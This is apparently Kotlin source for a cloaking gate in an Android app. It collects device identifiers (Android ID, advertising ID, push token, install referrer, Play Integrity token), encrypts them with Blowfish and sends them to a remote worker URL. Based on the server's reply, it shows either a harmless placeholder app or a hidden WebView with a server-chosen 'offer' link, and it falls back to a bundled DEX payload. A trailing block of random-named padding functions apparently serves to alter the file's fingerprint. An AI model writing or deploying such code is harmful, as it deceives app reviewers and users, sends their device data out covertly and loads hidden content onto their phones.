package com.kFjQzLm.VpRnTx.gate

import android.app.Activity
import android.content.Context
import android.net.Uri
import com.google.firebase.messaging.FirebaseMessaging
import com.kFjQzLm.VpRnTx.core.AppConstants
import com.kFjQzLm.VpRnTx.core.Utils
import com.kFjQzLm.VpRnTx.crypto.Blowfish
import com.kFjQzLm.VpRnTx.dex.DexOpener
import com.kFjQzLm.VpRnTx.net.CfIntake
import com.kFjQzLm.VpRnTx.net.CfTransport
import com.kFjQzLm.VpRnTx.storage.SharedPreferencesHelper
import com.kFjQzLm.VpRnTx.webview.ViewportBackend
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import kotlin.coroutines.resume

/**
 * Worker init step: assembles the v2 intake channels, posts them, decrypts the
 * response and either opens the DEX WebView or falls back to the placeholder app.
 */
object OfferResolve {

    suspend fun initStep(activity: Activity?, context: Context): GateResult {
        return try {
            val primaryWorkerUrl = Utils.getLink()
            if (primaryWorkerUrl.isEmpty()) return GateResult.Placeholder

            val appId = DeviceSignals.appId(context)
            val userAgent = DeviceSignals.userAgent(context)
            val androidId = DeviceSignals.androidId(context)
            val appVersion = DeviceSignals.appVersion(context)
            val playIntegrityToken = AsyncSignals.playIntegrityToken(context)
            val workerBaseUrl = CfTransport.normalizeBaseUrl(primaryWorkerUrl)

            val cookieFields = listOf(
                appId,
                InitRuntime.deviceId,
                InitRuntime.adId,
                InitRuntime.pushToken,
                InitRuntime.installRef,
                InitRuntime.finlOneLink,
                InitRuntime.finlNaming,
                userAgent,
                appVersion,
                androidId,
            )

            val (width, height) = DeviceSignals.screenSize(context)
            val bodyPlain =
                "event=app_start" +
                    "&device_model=" + DeviceSignals.deviceModel() +
                    "&manufacturer=" + DeviceSignals.manufacturer() +
                    "&locale=" + DeviceSignals.locale() +
                    "&timezone=" + DeviceSignals.timezone() +
                    "&network=unknown" +
                    "&screen=${width}x$height" +
                    "&session_id=" + DeviceSignals.sessionId() +
                    "&play_integrity_token=" + Uri.encode(playIntegrityToken)

            val channels = CfIntake.assemble(cookieFields, bodyPlain)
            val dataValue = Uri.encode(Blowfish.encryptB64u(channels.cookie))
            val headerValue = Uri.encode(Blowfish.encryptB64u(channels.header))
            val encryptedBody = Uri.encode(Blowfish.encryptB64u(channels.body))

            val responseText = withContext(Dispatchers.IO) {
                CfTransport.send(workerBaseUrl, dataValue, headerValue, encryptedBody)
            }

            if (responseText.isBlank()) {
                Utils.setUserBlock(1)
                unsubscribeFirebase()
                return GateResult.Placeholder
            }

            onInitResponse(activity, responseText)
        } catch (_: Exception) {
            unsubscribeFirebase()
            GateResult.Placeholder
        }
    }

    private suspend fun onInitResponse(
        activity: Activity?,
        responseText: String,
    ): GateResult {
        return try {
            val decryptedResponse = Blowfish.decryptB64u(responseText)
            if (decryptedResponse.isEmpty()) return GateResult.Placeholder

            val parsed = CfIntake.mapInitResponse(decryptedResponse)
            if (parsed.error != null || parsed.blockUser) {
                Utils.setUserBlock(1)
                unsubscribeFirebase()
                return GateResult.Placeholder
            }

            if (parsed.redirectUrl != null && parsed.redirectUrlInitial == null) {
                Utils.setUserBlock(1)
                unsubscribeFirebase()
                return GateResult.Placeholder
            }

            if (parsed.redirectUrlInitial != null) {
                try {
                    SharedPreferencesHelper.saveString(AppConstants.FIN_KEY, parsed.redirectUrlInitial)
                } catch (_: Exception) {
                }
                val finalUrl = InitRuntime.appendSendId(
                    parsed.redirectUrlInitial,
                    InitRuntime.pendingSendId,
                )

                // The overlay WebView is already preloaded with the worker privacy
                // policy (hidden behind the loader) — reveal it and load the link.
                val shown = if (activity != null) {
                    ViewportBackend.show(activity, finalUrl)
                } else {
                    false
                }
                if (shown) return GateResult.Webview

                // Built-in overlay unusable: fall back to the bundled DEX payload
                // instead of dropping the offer and showing the placeholder.
                val opened = if (activity != null) {
                    DexOpener.open(activity, finalUrl)
                } else {
                    false
                }
                return if (opened) GateResult.Webview else GateResult.Placeholder
            }

            unsubscribeFirebase()
            GateResult.Placeholder
        } catch (_: Exception) {
            unsubscribeFirebase()
            GateResult.Placeholder
        }
    }

    suspend fun unsubscribeFirebase() {
        try {
            withTimeoutOrNull(5_000) {
                suspendCancellableCoroutine { cont ->
                    try {
                        FirebaseMessaging.getInstance().deleteToken().addOnCompleteListener {
                            if (cont.isActive) cont.resume(Unit)
                        }
                    } catch (_: Exception) {
                        if (cont.isActive) cont.resume(Unit)
                    }
                }
            }
        } catch (_: Exception) {
            // silent
        }
        InitRuntime.pushToken = ""
    }

    
}

/* autopad-begin */
private object Padfezovygerqay {
    private fun lomififu(rujasowi: Int): Int {
        val surapobo = rujasowi + 7
        return surapobo
    }
    private fun qifigefu(kelegucu: Int): Int {
        val waxuqyja = kelegucu + 82
        return waxuqyja
    }
    private fun gosupuko(qysuwaqe: Int): Int {
        val wadineby = qysuwaqe + 53
        return wadineby
    }
    private fun gegiqahi(cofeqepo: Int): Int {
        val punagivi = cofeqepo + 35
        return punagivi
    }
    private fun hekumiqe(wumypeto: Int): Int {
        val kuwitovo = wumypeto + 68
        return kuwitovo
    }
    private fun kawesyje(sejelygu: Int): Int {
        val sasecini = sejelygu + 87
        return sasecini
    }
    private fun nasuguti(jokehybo: Int): Int {
        val qovosixi = jokehybo + 22
        return qovosixi
    }
    private fun pytytiwe(dogedyfa: Int): Int {
        val vyxewabo = dogedyfa + 7
        return vyxewabo
    }
    private fun nezatocy(qadysuco: Int): Int {
        val vakepocu = qadysuco + 54
        return vakepocu
    }
}
/* autopad-end */
